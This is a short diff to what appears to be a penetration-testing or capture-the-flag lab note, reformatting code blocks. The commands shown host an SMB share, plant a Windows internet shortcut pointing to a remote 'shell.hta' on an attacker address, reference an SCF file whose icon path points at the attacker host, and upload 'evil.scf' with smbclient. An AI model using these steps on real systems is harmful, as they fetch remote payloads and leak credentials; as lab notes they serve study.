@@ -88,8 +88,17 @@ impacket-smbserver -smb2support share .
 ```powershell
 # In target Windows machine (powershell)
 $url = "file://10.10.14.10/share/shell.hta"
+```
+
+```powershell
 $shortcutPath = "C:\Windows\Tasks\shell.url"
+```
+
+```powershell
 $shortcutContent = "[InternetShortcut]`r`nURL=$url"
+```
+
+```powershell
 Set-Content -Path $shortcutPath -Value $shortcutContent
 ```
 
@@ -120,8 +129,11 @@ IconFile=\\10.10.14.10\icon
 #### Upload the malicious shortcut
 
 ```bash
+# In our local Linux machine
 smbclient -N \\\\10.10.11.10\\share\\
+```
 
+```bash
 mput evil.scf
 ```
 
